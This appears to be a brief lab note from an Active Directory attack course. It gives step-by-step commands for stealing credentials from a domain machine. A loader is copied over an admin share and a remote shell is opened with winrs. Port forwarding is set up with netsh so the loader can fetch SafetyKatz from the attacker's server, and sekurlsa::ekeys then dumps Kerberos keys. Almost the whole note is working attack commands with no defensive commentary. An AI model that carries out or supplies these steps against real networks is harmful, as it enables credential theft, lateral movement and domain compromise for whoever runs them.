copy loader to location
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-<>\C$\Users\Public\Loader.exe
```
host safteykatz.exe on hfs
```
winrs -r:dcorp-<> cmd
```
launch powershell 
```
powershell
```
enable port forwarding
```
$null | winrs -r:dcorp-<> "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

```
extract credentials
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

[[Rubeus]]

